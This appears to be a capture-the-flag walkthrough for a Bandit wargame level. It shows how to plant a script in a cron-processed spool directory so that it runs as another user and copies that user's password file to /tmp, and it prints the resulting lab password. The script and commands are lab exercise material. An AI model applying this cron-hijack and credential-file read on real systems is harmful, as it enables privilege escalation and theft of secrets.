# Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution
Steps:
1. Find the cronjob and figure out what it does.
2. Create a directory and file where the flag will be outputted.
3. Create a script. 

Notes:
- The cronjob runs all scripts in /var/spool/bandit24 every minute.
- Make sure the file for the flag output and the script are availabe to other users using chmod.
- Password is located in /etc/bandit_pass/bandit24.

Script:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/wolder/pass
```

Command:
```
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/wolder/
bandit23@bandit:/etc/cron.d$ cd /tmp/wolder
bandit23@bandit:/tmp/wolder$ touch pass
bandit23@bandit:/tmp/wolder$ chmod 777 pass
bandit23@bandit:/tmp/wolder$ nano /var/spool/bandit24/wscript.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/tmp/wolder$ chmod 777 /var/spool/bandit24/wscript.sh
bandit23@bandit:/tmp/wolder$ cat pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Password: **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
